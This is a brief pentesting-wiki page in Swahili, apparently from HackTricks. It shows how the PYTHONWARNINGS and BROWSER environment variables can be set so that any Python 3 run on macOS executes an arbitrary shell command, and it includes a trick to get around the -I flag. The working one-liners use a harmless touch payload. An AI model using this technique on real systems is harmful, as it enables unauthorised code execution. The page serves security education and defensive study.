# Injection ya Python Applications katika macOS

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia vigezo vya mazingira vya `PYTHONWARNINGS` na `BROWSER`

Inawezekana kubadilisha vigezo vyote viwili vya mazingira ili kutekeleza code yoyote kila python inapoitwa, kwa mfano:<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
